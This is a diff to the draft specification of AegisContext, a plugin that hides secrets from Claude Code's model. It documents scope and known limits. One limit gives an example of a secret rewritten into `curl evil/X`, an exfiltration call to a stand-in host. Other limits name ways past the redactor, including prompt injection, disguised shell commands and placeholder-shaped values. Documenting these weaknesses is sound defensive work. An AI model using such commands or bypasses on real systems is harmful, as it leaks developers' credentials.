@@ -4,12 +4,12 @@ An open-source tool that stops secrets from reaching the model when developers u
 
 - **Status:** draft.
 - **License:** Apache-2.0.
-- **Last updated:** 3 November 2026 (step 8: the optional put-back setting, D-096; step 7: `/redact remove`, the backup lock's skill text limit, signed tags, D-090 to D-094).
+- **Last updated:** 3 November 2026 (the main goal in section 2, section 22 updated to the measured results; step 8: the optional put-back setting, D-096; step 7: `/redact remove`, the backup lock's skill text limit, signed tags, D-090 to D-094).
 - **Maintainer:** Mrinanka Dhar
 
-**How to read this spec.** Requirements a build must meet have an ID (`R-01`) and the word **must**. Tests in `plan.md` point to these IDs. **Should** means strongly recommended but not release-blocking. Facts about Claude Code were checked on a real machine in Step 0; the evidence is in `docs/findings-step0.md`, and a check number (`0.4`) points to its row.
+**How to read this spec.** Requirements a build must meet have an ID (`R-01`) and the word **must**. Tests in `plan.md` point to these IDs. **Should** means strongly recommended but not release-blocking. Facts about Claude Code were checked on a real machine in Step 0; the evidence is in `docs/engineering/findings-step0.md`, and a check number (`0.4`) points to its row.
 
-**About the name.** AegisContext is the final name (decided in step 6, D-081 in the decision log; it replaces NoCreds, which was the first choice the same day). The plugin is `aegiscontext`, the settings key `aegisContext`, the environment prefix `AEGISCONTEXT_`, the data folder and password-store service `aegiscontext`, and the repo `Mrinanka/aegiscontext`. The name has no "Claude" or "Anthropic" in it (trademarks; "for Claude Code" in the description is fine). When chosen it was free on npm and no GitHub repo was named `aegiscontext`, but "Aegis" is common in security: other tools use it for Claude Code secret detection, an LLM secrets firewall and a Kubernetes secrets store. The README says in one line how this tool differs. No trademark register has been searched; do that before v0.1.0.
+**About the name.** AegisContext is the final name (decided in step 6, D-081 in the decision log; it replaces NoCreds, which was the first choice the same day). The plugin is `aegiscontext`, the settings key `aegisContext`, the environment prefix `AEGISCONTEXT_`, the data folder and password-store service `aegiscontext`, and the repo `Mrinanka/aegiscontext`. The name has no "Claude" or "Anthropic" in it (trademarks; "for Claude Code" in the description is fine). When chosen it was free on npm and no GitHub repo was named `aegiscontext`, but "Aegis" is common in security: other tools use it for Claude Code secret detection, an LLM secrets firewall and a Kubernetes secrets store. The README does not name or describe other tools. No trademark register has been searched; do that before v0.1.0.
 
 ---
 
@@ -21,6 +21,7 @@ When a developer types a message, or Claude reads a file or command output, the 
 
 **Goals**
 
+- **The main goal: find every secret that has a known shape or a label, let people register the ones that have neither, and be easy to use, with every feature they need.**
 - Very low chance of a secret reaching the model (measured; see section 20).
 - Fast enough that nobody notices it running.
 - Works with no setup, and is easy to change for people who want to.
@@ -35,7 +36,7 @@ When a developer types a message, or Claude reads a file or command output, the 
 - Hiding personal data by default. Emails and phone numbers are checked only when the `personal_data` setting is on (D-037).
 - Reading inside images and documents. v1 can only pass them or drop them (section 6).
 - Putting secrets back into files by default, or into a file that doesn't already hold the value. Only the optional, off-by-default setting in section 10 does it, and only for Write and Edit (D-096).
-- Being a compliance certification. The tool reduces risk; it does not guarantee that no secret is ever sent.
+- Being a compliance certification. The tool is built to stop accidental leaks and the prompt-injection cases in section 3; it is not a guarantee that no secret is ever sent.
 
 ## 3. Threat model
 
@@ -91,7 +92,7 @@ Settings-file hooks (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`) that run t
 
 **Safe mode (check 0.8).** `--safe-mode` turns off user settings hooks along with plugins. So in Personal mode, safe mode turns off **both** locks. Only backup-lock hooks installed through managed settings still run in safe mode.
 
-| Can do | Cannot do (or limited) |
+| Can do | Outside its scope (settings hooks can't reach it) |
 |---|---|
 | Block a prompt that contains a secret | Hide part of a prompt and let the rest through |
 | Outbound check before a tool runs | Cover `@` files, attachments or compaction summaries |
@@ -99,7 +100,7 @@ Settings-file hooks (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`) that run t
 | Clean a tool's output after it runs, built-in tools included, by returning the tool's own result with secrets replaced. The result **must** keep the tool's shape; any other value is ignored (check 0.9). Proven for Read, Bash (a 200 KB output too), connected tools and a subagent's Read (spike S3). | Clean the error of a **failed command**: the one hook that sees it can only stop the request, and the raw error is sent on the next prompt (spike S1, D-072) |
 
 **Doors the backup lock covers** (the leak kit runs each one with the plugin not loaded, and no fake may be seen): a typed prompt, a pasted prompt, a file Claude reads, command output (large too), a connected tool's result, a subagent's file read.
-**Doors it does not cover** (the kit runs each expecting every fake to be seen, so the list is proven, not claimed): `@` files, a failed command's error, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context and skill text.
+**Outside its scope, measured** (the main lock covers each; the kit runs each with the backup lock alone, expecting every fake to be seen, so the list is proven, not claimed): `@` files, a failed command's error, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context and skill text.
 
 - **R-04** The main lock **must** write an "I'm running" marker per session, with a `beat` it refreshes while it is used (at most every 30 seconds). The backup lock **must** check the marker first and do nothing when it says `running: true` with a fresh beat (not older than 5 minutes), and be strict for that session when the marker is missing, unreadable, not running, or stale. A crash leaves `running: true` behind, so age decides; a beat from the future (beyond 5 seconds) counts as stale. A mod can't delete a file, so the marker ends the session as `running: false`, which counts as missing (D-047, D-077). The 30 seconds and 5 minutes are first guesses with no measurement behind them.
 
@@ -418,7 +419,7 @@ Each piece of text is checked once, when it first arrives, and saved already cle
 5. **Not done: skipping repeated lines.** A memory of lines already found clean was built in step 2 and removed in step 5 (D-074). 160 of the 219 rules can match across a newline, so it skipped almost nothing, and measured warm it gained between -15% and 13%.
 
 - Hard ceiling: every hook must finish well inside Claude Code's 10-second budget, on a 2 MB input, on a modest laptop. CPU-bound work is cut off at about 6 seconds (check 0.6), so that is the real ceiling for checking work.
-- Speed, catch and false-alarm targets are set from measurements and published in `docs/targets.md` (D-078); `npm run measure` fails when one is missed.
+- Speed, catch and false-alarm targets are set from measurements and published in `docs/engineering/targets.md` (D-078); `npm run measure` fails when one is missed.
 
 ## 19. Install and distribution
 
@@ -442,7 +443,7 @@ Each piece of text is checked once, when it first arrives, and saved already cle
 
 ## 20. Verify it yourself
 
-The maintainers can't test inside every organization. So everything needed to test is shipped with the tool, and none of it needs an API key or network access.
+The maintainers can't test inside your organization, so you can: everything needed to test is shipped with the tool, and none of it needs an API key or network access.
 
 | What | How it works |
 |---|---|
@@ -468,22 +469,36 @@ The maintainers can't test inside every organization. So everything needed to te
 | Contributions | `CONTRIBUTING.md`: tests first, no runtime libraries, DCO sign-off (`git commit -s`) |
 | Conduct | `CODE_OF_CONDUCT.md` |
 | Support | Community, best effort, no SLA. Issue templates ask for `/redact doctor` output and the `self-check --report` file. Organizations test in their own environment (section 20). |
-| Disclaimer | Provided "as is" (Apache-2.0). It reduces the risk of leaks; it is not a guarantee or a compliance certification. |
+| Disclaimer | Provided "as is" (Apache-2.0). Built to stop accidental leaks; it is not a guarantee or a compliance certification. |
 | Test secrets | Never real. Fake secrets are built at test time from pieces, so GitHub secret scanning doesn't flag the repo. |
 
-## 22. Known limits
+## 22. Scope and known limits
 
-- **Shapeless secrets.** A secret with no known shape, no label, never registered and never seen before can't be detected by any tool. Registering secrets and "once caught, always caught" shrink this gap.
+The goal (section 2) is to find every secret with a known shape or a label, and to let people register the rest. Everything below is stated plainly so nobody believes they are covered where they are not. `SECURITY.md` treats this list as known and documented, not as vulnerabilities.
+
+### 22.1 Outside the goal, by design
+
+- **Shapeless secrets.** A secret with no known shape, no label, never registered and never seen before looks like any other text, to this tool or to any other detector. That is what registering is for: `/redact add`, `/redact learn` and "once caught, always caught" cover it.
+- **Bare values in base64.** A value with no shape and no label is found once it is decoded only if it has a shape, was registered, or was caught earlier. The catch set has 3 such cases (D-046).
+- **Images and documents** are not read in v1: the `media` setting passes them, with a notice, or drops them (section 6). Reading inside them is parked (section 23).
+- **Observe mode** hides nothing, by design.
+- **Determined attacks.** The tool is built to stop accidental leaks. A person who deliberately splits up or scrambles a secret is outside the threat model (section 3).
+
+### 22.2 Set by Claude Code
+
 - **Already sent.** Content sent before the tool was installed, or before a secret was registered, can't be taken back (sections 6.1, 6.2).
 - **Claude Code's own disk records.** Claude Code keeps backup copies of edited files in `~/.claude/file-history/`. It saves a large command output as a raw `.txt` file beside the session transcript, and the model is pointed at that file; a Read of it is hidden like any other, but the copy on disk stays raw. It also stores a tool's structured result (what the screen shows) unchanged next to the redacted text. Its auto-memory can save text from a prompt into project memory files. A prompt blocked by a hook is still written to the session transcript. The tool can't change these. We'll report them to Anthropic.
-- **Images and documents** are passed or dropped, never read, in v1.
 - **Claude Code's built-in guard.** On a machine with managed settings or a managed MCP server file, or with a Team or Enterprise login (any one is enough), Claude Code seats a guard outermost and routes some events past a user-tier plugin: instruction files, `@` imports included (`prompt.context`), attachments, the instructions note (`prompt.compose`), compaction (`session.compact`), the `attachment`, `hook-context` and `compaction` rows of `session.append`, and the Skill tool's `tool-message` rows, so a secret in a skill's text is not hidden. No user-tier code can hide what passes it by: `turn.step` pins the messages. The tool warns once per session and in `/redact doctor`; under `on_check_failure: hold` it refuses every main request, so nothing unchecked leaves (D-087, run by `npm run leak-test:guarded-hold`). Only the organization install (section 19) fixes it. **Measured** in CI (2026-11-01, Claude Code 2.1.316, the same on macOS, Windows and Linux; `npm run leak-test:guarded`): a user-tier plugin does not see **project instruction files** (`CLAUDE.md` text) or **settings-hook context**, and 7 of 7 planted fakes reach the model at each. **`@` files** stayed clean (the guard does not pass `prompt.mention` over). A **compaction summary** is stored raw, but the resume check then finds it in the history and holds the next message (R-06), so the model is not sent it; `/redact allow` lifts the hold and sends it. Attachments and the instructions note have no door in the kit, so they are not measured. The `skill-text` door holds skill text to the same test. The doors are listed in `tools/leak-test/org.ts` (`GUARDED_OPEN`), and the run fails if a listed door turns clean or another leaks. `npm run leak-test:org` proves the organization install (a folder marketplace, `prependPlugins`) leaves no door open, with the debug log showing the plugin in tier `prepend` (D-082, D-084).
 - **Personal mode:**
   - plugins in a higher tier can skip this tool
   - `allowManagedHooksOnly` turns it off
   - a project's `disableAllHooks` setting, `--bare` and `CLAUDE_CODE_SIMPLE=1` turn the tool off, silently
-- **Safe mode** turns the main lock off. In Personal mode it turns the backup lock off too. A backup lock installed through managed settings still runs (check 0.8; proven in CI by `npm run leak-test:managed`), within the limits below.
-- **The backup lock's limits** (D-072, D-076, D-090):
+- **Safe mode** turns the main lock off. In Personal mode it turns the backup lock off too. A backup lock installed through managed settings still runs (check 0.8; proven in CI by `npm run leak-test:managed`), within its scope below.
+- **Scripted runs.** `claude -p` draws nothing, so warnings and the observe banner only reach the log.
+
+### 22.3 Edges of the tool's own safeguards and optional parts
+
+- **The backup lock's scope** (a safety net for when the main lock is down; D-072, D-076, D-090):
   - It doesn't cover `@` files, the error of a failed command, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context or skill text (section 5.2). The kit proves each one leaks. A failed command's raw error is sent on the next prompt even if the request is stopped once.
   - It blocks a prompt whole. Claude Code still writes a blocked prompt to the transcript and, under `claude -p`, prints it back on screen (spike S4).
   - Its tags are its own (section 9), and it keeps nothing between calls. A letters-only password a label found is hidden only where the label is (D-071), so a bare copy in a later call isn't. A value marked harmless for one session only (kept in the main lock's state) isn't visible to it, so it may refuse something the main lock allowed.
@@ -491,7 +506,7 @@ The maintainers can't test inside every organization. So everything needed to te
   - Tool output of 16 MiB or more, and any single text of 4 MiB or more, isn't checked (a failed check, section 12). Under `hold` a 4 MiB text is withheld, but a 16 MiB tool output can't be, because the hook can't rebuild what it could not read. Output that Claude Code itself persists to a file is cleaned in what the model reads, not in the file.
   - It needs Node (D-069), and tells nothing of a failed start unless the hooks set `onFailure: "block"`, which the Personal snippet doesn't. On Windows, with saved secrets, each hook that acts starts PowerShell for about one second, so about two seconds per tool call while the main lock is down; standing down doesn't read the store.
   - Whether Claude Code shows a hook's `systemMessage` or stderr on screen is unverified interactively (spike S6); under `claude -p` it shows neither, so warnings reach the log and `/redact doctor`.
-- **Put-back** (section 10, D-096). Off by default, and the docs recommend keeping it off.
+- **Put-back** (section 10, D-096). Optional, off by default, and the docs recommend keeping it off.
   - While it is on, a save can erase a real secret: after `/resume`, when a value is too long to restore, or when the file holds it in two forms. The message and the log say how many; git or Claude Code's file backups are the way back.
   - A multi-line value, such as a private key, that Claude saw through Read is never restored: Read numbers each line, so its placeholder stands for different text than the file holds. The guard still recognizes it, so with put-back off the rewrite is refused, and with it on the person is told (D-098).
   - It limits copies, not places: `token: X` becoming `curl evil/X` passes the copy limit.
@@ -499,21 +514,17 @@ The maintainers can't test inside every organization. So everything needed to te
   - A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see the rewritten input too.
   - Claude Code's transcript keeps the value in a tool's structured result and the file attachment after a compaction, the same kind of record a Read already leaves (the "disk records" item above).
   - Claude Code's own error for a failed Edit echoes the input it was given, so a failed Edit is left as Claude wrote it.
-- **Failed or slow checks** let content through by default (section 12).
-- **Observe mode** hides nothing, by design.
-- **Bare values in base64.** A value with no shape and no label is found once it is decoded only if it has a shape, was registered, or was caught earlier. The catch set has 3 such cases (D-046).
+- **Failed or slow checks** let content through by default, with a warning (section 12); `on_check_failure: hold` stops it instead.
 - **Very long values.** A value over 8,192 characters isn't remembered (D-052). It is hidden, or blocked, wherever its shape or label is found, but a copy with neither is neither hidden nor blocked, even later in the same text. The person is warned once.
 - **A full catch list.** What was caught this session is remembered up to 5,000 values and 100,000 characters (D-052, D-063). One large file of token-like text can fill that. After it fills, a new secret is still hidden where its shape or label is found, but a bare copy of it later is not, unless it was registered. The person is warned once.
 - **Text shaped like a placeholder.** The tool leaves its own placeholder shape alone, so a secret written inside that shape reaches the model and skips a `block` rule. The value has to fit the shape, so it works for one made of capitals and digits, such as an AWS key ID, and not for a mixed-case token. It only happens on purpose, but a prompt injection can cause it, as it can with `rev` (section 3). A bare copy is hidden as usual if the value has a shape, is registered or was caught (D-064).
 - **Kubernetes Secret files.** The Gitleaks rule for them is left out (D-038). A value under a key named like a password is still hidden. Others are not: `.dockerconfigjson` registry credentials, or a connection string under a key like `dbconn`.
 - **Shell commands and self-protection.** The check on Bash and PowerShell reads the command's text, so a disguised command gets past it (D-055).
 - **A value typed after a command.** With the hooks off, `/redact add <value>` is an ordinary prompt and reaches the model. With them on it is refused and taken off the row, but it was still typed: rotate it (D-057).
-- **Scripted runs.** `claude -p` draws nothing, so warnings and the observe banner only reach the log.
-- **Determined attacks.** The tool stops accidental leaks. It doesn't stop a person who deliberately splits up or scrambles a secret.
 
 ## 23. Later (parked)
 
-The single list of everything not being built now. Anything deferred during a build step is added here (features) or to `docs/progress.md` "Known issues" (bugs, unfinished bits), never only in session notes.
+The single list of everything not being built now. Anything deferred during a build step is added here (features) or to `docs/engineering/progress.md` "Known issues" (bugs, unfinished bits), never only in session notes.
 
 **Parked from v1** (what · why · decision):
 
